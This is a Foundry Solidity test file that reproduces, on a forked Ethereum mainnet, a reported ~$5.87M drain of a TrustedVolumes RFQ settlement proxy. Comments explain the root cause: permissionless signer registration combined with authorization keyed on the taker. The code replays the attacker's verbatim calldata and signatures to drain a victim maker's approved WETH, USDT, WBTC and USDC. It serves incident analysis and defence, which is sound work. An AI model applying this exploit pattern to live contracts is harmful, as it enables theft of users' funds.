// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$5.87M USD
//            (1,291.16 WETH + 206,282.45 USDT + 16.939 WBTC + 1,268,771.49 USDC)
// Attacker / signer   : 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100 (the registered "allowed order signer")
// Attack Contract     : 0xd4d5DB5EC65272b26F756712247281515f211e95 (created by the attack tx; acts as `taker`)
// Vulnerable Contract : 0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756 (TrustedVolumes RFQ settlement proxy)
//                       -> delegatecalls implementation 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8 (UNVERIFIED bytecode)
// Victim (maker/resolver) : 0x9ba0cf1588e1dfa905ec948f7fe5104dd40eda31 (granted UNLIMITED approval to the proxy)
// Attack Tx           : 0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513
// @Analysis
// Attack date: May 7, 2026  Chain: Ethereum  Block: 25039670 (tx index 8)
// rekt.news: https://rekt.news/trustedvolumes-rekt
// Analyses: https://www.darknavy.org/web3/exploits/trustedvolumes-rfq-proxy-drain/
//           https://blog.verichains.io/p/trustedvolumes-exploit-analysis
//
// Run:
//   forge test --contracts src/test/2026-05/TrustedVolumes_exp.sol --match-contract TrustedVolumesExploit -vv
//
// ---------------------------------------------------------------------------------------------------
// Root cause (two-bug chain on an RFQ settlement contract):
//
// The proxy settles signed RFQ orders. An order says: maker gives `makerAmount` of `makerAsset` to the
// taker, taker gives `takerAmount` of `takerAsset` to the maker; the maker (the party whose funds move
// out via its standing approval to the proxy) must have signed/authorized the order. The maker can
// delegate signing to another key via an "allowed order signer" registry.
//
//  BUG #1 -- permissionless signer registration:
//      registerAllowedOrderSigner(address signer, bool allowed)   selector 0xea7faa61
//      has ZERO access control. It writes  _allowedOrderSigner[msg.sender][signer] = allowed.
//      Anyone can register any EOA as a valid signer *for their own key*.
//
//  BUG #2 -- authorization keyed on the wrong party (taker, not maker):
//      The fill function (selector 0x4112e1c2) recovers the order signer with ecrecover, then checks
//      authorization as  _allowedOrderSigner[order.taker][recoveredSigner]  -- it uses the TAKER
//      (an attacker-controlled field) as the lookup key instead of the order.maker who actually owns
//      the funds. It then pulls  makerAsset  FROM order.maker  via the maker's standing approval.
//
// Exploit: the attacker contract (= the taker) calls registerAllowedOrderSigner(attackerEOA, true),
// which sets _allowedOrderSigner[taker][attackerEOA] = true. It then submits orders where:
//   maker = the victim resolver (0x9ba0..., which holds the assets and has unlimited approval to the proxy),
//   taker = the attacker contract,
//   makerAsset/makerAmount = the asset to steal (e.g. 1291 WETH),
//   takerAsset/takerAmount = USDC / 1 wei (the attacker pays 1 unit dust per order),
//   signature = signed by attackerEOA over the order.
// Because authorization is checked against the taker key (which the attacker registered), the
// attacker-signed orders pass even though the victim maker never approved them, and the maker's
// approved balances are drained out. Four orders drain WETH, USDT, WBTC and USDC for ~$5.87M.
//
// ---------------------------------------------------------------------------------------------------
// PoC method:
// The settlement implementation is UNVERIFIED bytecode, so this PoC reproduces the hack by replaying the
// attacker's EXACT on-chain calldata (the register call + the 4 signed fill orders, including the real
// ECDSA signatures the attacker produced) against a fork pinned one block before the attack. We act as
// the original attack contract address (the order `taker`) so the registry key and the signed `taker`
// field line up. Replaying the genuine calldata is the faithful, deterministic way to demonstrate an
// exploit on a contract whose source is not published.

interface IRfqProxy {
    // registerAllowedOrderSigner(address,bool) -- selector 0xea7faa61, NO access control (Bug #1)
    function registerAllowedOrderSigner(address signer, bool allowed) external;
}

contract TrustedVolumesExploit is Test {
    address constant PROXY = 0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756; // RFQ settlement proxy
    address constant ATTACKER_EOA = 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100; // registered signer + final beneficiary
    // The attacker's deployed contract from the real tx -- it is the order `taker` and the registry key.
    // We impersonate this address so the on-chain signatures (which commit to taker = this address) verify.
    address constant TAKER = 0xD4D5DB5EC65272B26F756712247281515F211E95;
    address constant VICTIM_MAKER = 0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31; // resolver with unlimited approval

    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    uint256 constant ATTACK_BLOCK = 25_039_670;

    // ---- Verbatim attacker calldata captured from the attack tx trace (eth_getTransactionByHash + debug trace) ----

    // registerAllowedOrderSigner(0xC3EB...9100, true)
    bytes constant CD_REGISTER =
        hex"ea7faa61000000000000000000000000c3ebddea4f69df717a8f5c89e7cf20c1c03891000000000000000000000000000000000000000000000000000000000000000001";

    // fill(order) 0x4112e1c2 -- order layout:
    //   [takerAsset, makerAsset, takerAmount, makerAmount, taker, maker, expiry, nonce, v, r, s, sigType]
    // #1 drain 1,291.16 WETH (takerAsset USDC, makerAsset WETH, takerAmount 1)
    bytes constant CD_FILL_WETH =
        hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000045fe75b854413cec06000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001b4f6496eb7ebd74e91df255d580b631e48513f271c60994253411dcf2e1aeb4c00b1ad0f7ff67e96997d22b14aa0908b147b6b71bf76c3ef3f41a9c3a35eda6910000000000000000000000000000000000000000000000000000000000000002";

    // #2 drain 206,282.45 USDT
    bytes constant CD_FILL_USDT =
        hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000300764581c000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001c957d7e01305f29e1b3c38169aa877e2e3d7250a25363231074f027462cebb0c243ee738d4a0abe1f96b78c82cefe32af7ba4ad064f270dd0bf417f33726f4bb80000000000000000000000000000000000000000000000000000000000000002";

    // #3 drain 16.939 WBTC
    bytes constant CD_FILL_WBTC =
        hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59900000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000064f705f7000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000001c39a0cb78995ca12d4999f1594e6fd0cc4c8ad9db63f268c38a6f5297806927c904190fdbb1d3a4aa8d58b5125ff293aa8888a9d7891b94dfcecd4500b27b9d270000000000000000000000000000000000000000000000000000000000000002";

    // #4 drain 1,268,771.49 USDC (takerAsset USDC, makerAsset USDC)
    bytes constant CD_FILL_USDC =
        hex"4112e1c2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000012768ac846f000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001b4a4632981a75d969b349af56527c32e7c153c9e3a0ab6f2342b9ffab6fe099ba2bcba1cc93023924b884ed8855cb015a87b69010ed217f98e3c20433284519230000000000000000000000000000000000000000000000000000000000000002";

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK - 1);
        vm.label(PROXY, "RFQ_Proxy");
        vm.label(TAKER, "AttackContract(taker)");
        vm.label(ATTACKER_EOA, "Attacker(signer)");
        vm.label(VICTIM_MAKER, "VictimResolver(maker)");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(WBTC), "WBTC");
    }

    function testExploit() public {
        console.log("--- TrustedVolumes RFQ proxy drain (permissionless signer + wrong-key authorization) ---");
        console.log("Attack date: May 7, 2026  Chain: Ethereum  Block: %s\n", ATTACK_BLOCK);

        // Victim maker holds the assets and has granted unlimited approval to the proxy.
        uint256 mWeth = WETH.balanceOf(VICTIM_MAKER);
        uint256 mUsdt = USDT.balanceOf(VICTIM_MAKER);
        uint256 mWbtc = WBTC.balanceOf(VICTIM_MAKER);
        uint256 mUsdc = USDC.balanceOf(VICTIM_MAKER);
        console.log("Victim resolver approval to proxy (WETH):", WETH.allowance(VICTIM_MAKER, PROXY));
        console.log("Victim resolver balances before:");
        console.log("  WETH:", mWeth);
        console.log("  USDT:", mUsdt);
        console.log("  WBTC:", mWbtc);
        console.log("  USDC:", mUsdc);
        require(mWeth > 0 && mUsdc > 0, "victim has no funds at fork block");

        // The attacker paid 1 wei USDC dust per order (4 total). Seed the taker with that dust + approval,
        // exactly as the real attack contract did in its constructor.
        deal(address(USDC), TAKER, 4);

        // Everything below runs as the attack contract (the order `taker` / the registry key).
        vm.startPrank(TAKER);

        USDC.approve(PROXY, type(uint256).max);

        // Bug #1: permissionless registration. The taker (an arbitrary attacker address, NOT the proxy owner
        // and NOT the victim maker) registers the attacker EOA as an allowed signer for its own key.
        (bool ok,) = PROXY.call(CD_REGISTER);
        require(ok, "registerAllowedOrderSigner failed");
        console.log("\n[Bug #1] registerAllowedOrderSigner(attackerEOA, true) succeeded with NO access control.");

        // Bug #2: authorization is checked against order.taker, so these attacker-signed orders drain the
        // victim maker's approved balances.
        (ok,) = PROXY.call(CD_FILL_WETH);
        require(ok, "fill WETH failed");
        (ok,) = PROXY.call(CD_FILL_USDT);
        require(ok, "fill USDT failed");
        (ok,) = PROXY.call(CD_FILL_WBTC);
        require(ok, "fill WBTC failed");
        (ok,) = PROXY.call(CD_FILL_USDC);
        require(ok, "fill USDC failed");

        vm.stopPrank();

        // Assets pulled out of the victim maker landed on the taker (the attack contract).
        uint256 gotWeth = WETH.balanceOf(TAKER);
        uint256 gotUsdt = USDT.balanceOf(TAKER);
        uint256 gotWbtc = WBTC.balanceOf(TAKER);
        uint256 gotUsdc = USDC.balanceOf(TAKER);

        console.log("\n[Bug #2] Attacker-signed orders accepted; victim maker drained.");
        console.log("Stolen by attack contract:");
        console.log("  WETH:", gotWeth);
        console.log("  USDT:", gotUsdt);
        console.log("  WBTC:", gotWbtc);
        console.log("  USDC:", gotUsdc);

        console.log("\nApprox USD value (round figures): ~$5.87M");

        // The victim maker lost each asset; the attacker received it.
        assertApproxEqAbs(WETH.balanceOf(VICTIM_MAKER), mWeth - gotWeth, 0, "WETH not drained from maker");
        assertApproxEqAbs(WBTC.balanceOf(VICTIM_MAKER), mWbtc - gotWbtc, 0, "WBTC not drained from maker");
        assertEq(gotWeth, 0x45fe75b854413cec06, "unexpected WETH amount"); // 1,291.16 WETH
        assertEq(gotUsdt, 0x300764581c, "unexpected USDT amount"); // 206,282.45 USDT
        assertEq(gotWbtc, 0x64f705f7, "unexpected WBTC amount"); // 16.939 WBTC
        assertGt(gotUsdc, 1_268_000e6, "unexpected USDC amount"); // ~1,268,771 USDC (minus 4 wei dust paid)

        console.log("\nExploit reproduced: unlimited maker approval + permissionless signer + wrong-key auth = full drain.");
    }
}
